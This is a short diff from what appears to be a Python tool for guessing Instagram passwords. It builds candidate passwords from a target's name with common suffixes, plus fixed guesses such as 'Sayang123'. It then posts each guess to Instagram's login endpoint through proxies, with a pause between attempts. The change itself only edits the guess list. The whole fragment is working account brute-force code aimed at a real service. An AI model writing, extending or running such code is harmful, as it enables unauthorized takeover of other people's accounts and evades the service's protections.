@@ -150,7 +150,7 @@ def gpkwd():
                          str(x) + "123",
                          str(x) + "12345",
                    ]
-                   litpas.append('Sayang123' + '\n' + 'Bangsat123')
+                   litpas.append('Sayang123')
                    for passw in set(litpas):
                        time.sleep(2)
                        reg = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=ua, data={'username': us,'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{passw}','queryParams': '{}'}, proxies=pro, timeout=10)
